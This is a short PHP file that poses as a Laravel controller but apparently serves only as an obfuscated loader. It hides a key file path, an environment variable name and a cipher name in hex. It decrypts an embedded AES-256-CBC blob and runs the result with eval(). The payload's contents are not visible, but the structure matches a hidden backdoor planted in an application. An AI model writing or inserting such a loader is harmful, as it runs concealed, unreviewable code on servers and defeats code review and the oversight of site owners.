<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('6Iqijn8MYjl7p8jXVPotaQ==');

$c=base64_decode(

'0yO1g53VJjwemOw5r3K6fKq4c7fJq3n6T2eDkAP3umLawYpdTSx+HMgd4kg60WjOoCEDEM8wTzpl' .
'5IcG4jwQgl+tdXJEH/4T+vWEyRXAAmu3nmu/lZrBTFrjbbzXrsBrmDpe2+nQ3TNOGF0BWs8rnMCl' .
'rKtfkAJVIu8r1VXAsEfR/AmyP2ys9WBLwmVnbuh1yJoeELAEU3kpOYCSx8dwQJPaNpN0b0hnfjtB' .
'rRzgXl1GVEI750QFm/BVLrenpzhqFWzE4xZ9u0LMpidT1H9F+bdgA60L9Uh+HF0juAFpFaA='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

